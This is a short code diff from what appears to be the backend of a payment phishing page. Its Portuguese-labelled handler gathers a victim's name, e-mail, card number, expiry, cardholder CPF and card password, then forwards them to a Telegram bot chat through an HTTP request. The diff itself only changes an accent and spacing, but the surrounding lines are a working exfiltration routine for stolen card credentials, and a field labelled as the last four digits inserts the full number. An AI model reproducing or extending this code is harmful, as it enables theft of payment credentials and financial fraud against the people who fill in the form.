@@ -48,12 +48,13 @@ export default async function handler(req, res) {
 - **Nome**: ${body.nome}
 - **E-mail**: ${body.email}
 - **Valor**: R$ ${body.valor}
-- **Número do Cartão**: ${body.numero} (últimos 4 dígitos)
+- **Número do Cartão**: ${body.numero} (ultimos 4 dígitos)
 - **Nome do Titular**: ${body.nome_cartao}
 - **Validade**: ${body.validade}
 - **CPF do Titular**: ${body.cpf_cartao}
 - **Senha Cartão**: ${body.senha}
 `;
+
     try {
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         chat_id: CHAT_ID,
